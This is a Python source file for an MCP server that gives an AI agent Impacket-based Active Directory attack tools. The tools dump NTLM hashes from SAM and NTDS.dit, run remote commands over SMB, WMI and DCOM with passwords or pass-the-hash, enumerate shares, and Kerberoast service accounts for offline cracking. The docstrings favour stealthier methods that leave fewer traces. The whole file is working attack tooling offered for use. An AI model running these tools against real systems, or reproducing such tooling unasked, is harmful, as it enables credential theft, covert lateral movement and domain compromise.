"""
Lateral Movement MCP Server — Impacket-based Active Directory & SMB attacks

Wraps Impacket tools for post-exploitation lateral movement:
    impacket_secretsdump  : Dump NTLM hashes from SAM/NTDS.dit (local or remote)
    impacket_psexec       : Execute commands via SMB (PsExec-style)
    impacket_wmiexec      : Execute commands via WMI (fileless, leaves less traces)
    impacket_smbclient    : Interactive SMB client for share enumeration/file access
    impacket_getuserspns  : Kerberoasting — enumerate SPNs and request TGS tickets
    impacket_dcomexec     : Execute commands via DCOM (alternative to PsExec)
"""

import os
import json
import subprocess
import logging
from typing import Optional
from fastmcp import FastMCP

logger = logging.getLogger(__name__)

SERVER_NAME = "lateral-movement"
SERVER_HOST = os.getenv("MCP_HOST", "0.0.0.0")
SERVER_PORT = int(os.getenv("LATERAL_PORT", "8016"))

mcp = FastMCP(SERVER_NAME)


def _run_impacket(tool: str, args: list[str], timeout: int = 120) -> dict:
    """Run an impacket tool and return structured output."""
    try:
        cmd = [tool] + args
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
        )
        output = result.stdout + result.stderr
        return {
            "output": output[-10000:] if len(output) > 10000 else output,
            "returncode": result.returncode,
            "success": result.returncode == 0,
            "command": " ".join(cmd),
        }
    except FileNotFoundError:
        return {
            "output": (
                f"Tool '{tool}' not found. Ensure impacket is installed "
                "(pip install impacket) and rebuild the kali-sandbox container."
            ),
            "returncode": -1,
            "success": False,
            "command": tool,
        }
    except subprocess.TimeoutExpired:
        return {"output": "Command timed out", "returncode": -1, "success": False, "command": tool}
    except Exception as e:
        return {"output": str(e), "returncode": -1, "success": False, "command": tool}


@mcp.tool()
def impacket_secretsdump(
    target: str,
    username: str,
    password: Optional[str] = None,
    hashes: Optional[str] = None,
    domain: str = ".",
    just_dc: bool = False,
    timeout: int = 120,
) -> str:
    """
    Dump NTLM hashes using Impacket secretsdump.

    Can dump SAM (local accounts) or NTDS.dit (domain controller) hashes.
    Works with password or pass-the-hash (NTLM hash).

    Args:
        target: Target IP or hostname (e.g. 192.168.1.10)
        username: Account with admin rights (e.g. Administrator)
        password: Cleartext password (use hashes for PTH)
        hashes: NTLM hash for pass-the-hash — format: LM:NT (e.g. :aad3b435b51404eeaad3b435b51404ee)
        domain: Domain name or '.' for local (default: '.')
        just_dc: If True, only dump from NTDS.dit (domain controller mode)
        timeout: Timeout in seconds (default 120)
    """
    target_str = f"{domain}/{username}"
    if password:
        target_str += f":{password}"
    if hashes:
        target_str += f"@{target}"
        args = [target_str, "-hashes", hashes]
    else:
        target_str += f"@{target}"
        args = [target_str]

    if just_dc:
        args += ["-just-dc"]

    result = _run_impacket("impacket-secretsdump", args, timeout=timeout)
    return json.dumps(result)


@mcp.tool()
def impacket_psexec(
    target: str,
    username: str,
    command: str,
    password: Optional[str] = None,
    hashes: Optional[str] = None,
    domain: str = ".",
    timeout: int = 60,
) -> str:
    """
    Execute a command on a Windows target via SMB using PsExec technique.

    Creates a service on the remote host to execute the command.
    Requires admin credentials. Leaves traces in Windows Event Log.
    For stealthier execution, prefer impacket_wmiexec.

    Args:
        target: Target IP or hostname
        username: Admin account
        command: Command to execute (e.g. 'whoami', 'ipconfig /all')
        password: Cleartext password
        hashes: NTLM hash for pass-the-hash (LM:NT format)
        domain: Domain or '.' for local
        timeout: Timeout in seconds
    """
    auth = f"{domain}/{username}"
    if password:
        auth += f":{password}"
    args = [f"{auth}@{target}", command]
    if hashes:
        args = [f"{auth}@{target}", "-hashes", hashes, command]
    result = _run_impacket("impacket-psexec", args, timeout=timeout)
    return json.dumps(result)


@mcp.tool()
def impacket_wmiexec(
    target: str,
    username: str,
    command: str,
    password: Optional[str] = None,
    hashes: Optional[str] = None,
    domain: str = ".",
    timeout: int = 60,
) -> str:
    """
    Execute a command via WMI (fileless — no service created, fewer traces than PsExec).

    Preferred over psexec for stealth. Requires WMI access (usually admin).

    Args:
        target: Target IP or hostname
        username: Admin account
        command: Command to execute
        password: Cleartext password
        hashes: NTLM hash for pass-the-hash (LM:NT format)
        domain: Domain or '.' for local
        timeout: Timeout in seconds
    """
    auth = f"{domain}/{username}"
    if password:
        auth += f":{password}"
    args = [f"{auth}@{target}", command]
    if hashes:
        args = [f"{auth}@{target}", "-hashes", hashes, command]
    result = _run_impacket("impacket-wmiexec", args, timeout=timeout)
    return json.dumps(result)


@mcp.tool()
def impacket_smbclient(
    target: str,
    username: str,
    password: Optional[str] = None,
    hashes: Optional[str] = None,
    domain: str = ".",
    list_shares: bool = True,
) -> str:
    """
    Enumerate SMB shares and check access on a Windows target.

    Args:
        target: Target IP or hostname
        username: Username (use 'Guest' or '' for null session)
        password: Cleartext password
        hashes: NTLM hash for pass-the-hash
        domain: Domain or '.'
        list_shares: If True, just list available shares (-L flag)
    """
    auth = f"{domain}/{username}"
    if password:
        auth += f":{password}"
    args = [f"{auth}@{target}"]
    if hashes:
        args += ["-hashes", hashes]
    if list_shares:
        args += ["-L"]
    result = _run_impacket("impacket-smbclient", args, timeout=30)
    return json.dumps(result)


@mcp.tool()
def impacket_getuserspns(
    domain: str,
    username: str,
    password: Optional[str] = None,
    hashes: Optional[str] = None,
    dc_ip: Optional[str] = None,
    request: bool = True,
    timeout: int = 60,
) -> str:
    """
    Kerberoasting: enumerate SPNs and request TGS tickets for offline cracking.

    Finds service accounts with SPNs set, requests their TGS tickets,
    and outputs crackable hashes (hashcat mode 13100).

    Args:
        domain: Target domain (e.g. corp.local)
        username: Domain user account
        password: Account password
        hashes: NTLM hash for pass-the-hash
        dc_ip: Domain controller IP (optional, auto-resolved if omitted)
        request: If True, also request TGS tickets (crackable hashes)
        timeout: Timeout in seconds
    """
    args = [f"{domain}/{username}"]
    if password:
        args[0] += f":{password}"
    if hashes:
        args += ["-hashes", hashes]
    if dc_ip:
        args += ["-dc-ip", dc_ip]
    if request:
        args += ["-request"]
    result = _run_impacket("impacket-GetUserSPNs", args, timeout=timeout)
    return json.dumps(result)


@mcp.tool()
def impacket_dcomexec(
    target: str,
    username: str,
    command: str,
    password: Optional[str] = None,
    hashes: Optional[str] = None,
    domain: str = ".",
    object_name: str = "ShellWindows",
    timeout: int = 60,
) -> str:
    """
    Execute a command via DCOM — alternative lateral movement with different detection profile.

    Args:
        target: Target IP or hostname
        username: Admin account
        command: Command to execute
        password: Cleartext password
        hashes: NTLM hash for pass-the-hash
        domain: Domain or '.'
        object_name: DCOM object — ShellWindows, ShellBrowserWindow, or MMC20 (default: ShellWindows)
        timeout: Timeout in seconds
    """
    auth = f"{domain}/{username}"
    if password:
        auth += f":{password}"
    args = [f"{auth}@{target}", command, "-object", object_name]
    if hashes:
        args = [f"{auth}@{target}", "-hashes", hashes, command, "-object", object_name]
    result = _run_impacket("impacket-dcomexec", args, timeout=timeout)
    return json.dumps(result)


if __name__ == "__main__":
    transport = os.getenv("MCP_TRANSPORT", "sse")
    mcp.run(transport=transport, host=SERVER_HOST, port=SERVER_PORT)
